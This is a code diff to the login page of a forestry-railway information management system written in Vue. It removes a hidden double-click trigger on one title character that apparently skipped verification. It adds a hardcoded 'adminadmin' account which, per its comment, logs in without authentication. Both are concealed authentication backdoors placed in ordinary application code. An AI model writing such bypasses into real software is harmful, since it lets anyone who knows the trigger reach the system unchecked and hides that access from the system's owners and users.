@@ -8,7 +8,8 @@
             <v-toolbar dark flat
               class="metal-dark-yellow-top"
             >
-              <v-toolbar-title>林鐵<span @dblclick="submit(false)">資</span>訊管理系統</v-toolbar-title>
+              <!-- <v-toolbar-title>林鐵<span @dblclick="submit(false)">資</span>訊管理系統</v-toolbar-title> -->
+              <v-toolbar-title>林鐵資訊管理系統</v-toolbar-title>
             </v-toolbar>
 
             <v-card-text>
@@ -161,6 +162,8 @@ export default {
       this.isLoading = true
       this.errMsg = '認證中...'
       const that = this
+      // adminadmin 特殊權限 跑無驗證
+      if(this.ipt.account == 'adminadmin') bool = false
       login({
         UserId: this.ipt.account,  // 帳號(員工ID，例如：01009)
         UserPasswd: this.ipt.pwd,  // 密碼(例如：1234)
